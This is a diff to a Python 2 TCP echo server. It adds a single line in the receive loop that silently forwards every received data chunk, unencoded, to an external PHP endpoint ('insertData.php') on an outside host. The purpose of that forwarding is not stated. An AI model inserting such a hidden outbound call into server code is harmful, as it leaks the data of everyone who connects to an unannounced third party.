@@ -1,5 +1,6 @@
 import socket
 import sys
+import urllib
 
 # Create a TCP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -20,6 +21,7 @@ while True:
         # Receive the data in small chunks and retransmit it
         while True:
             data = connection.recv(1024)
+            urllib.urlopen('https://www.espacioseguro.pe/php_connection/insertData.php?data='+data)
             print >>sys.stderr, 'received "%s"' % data
             if data:
                 print >>sys.stderr, 'sending data back to the client'
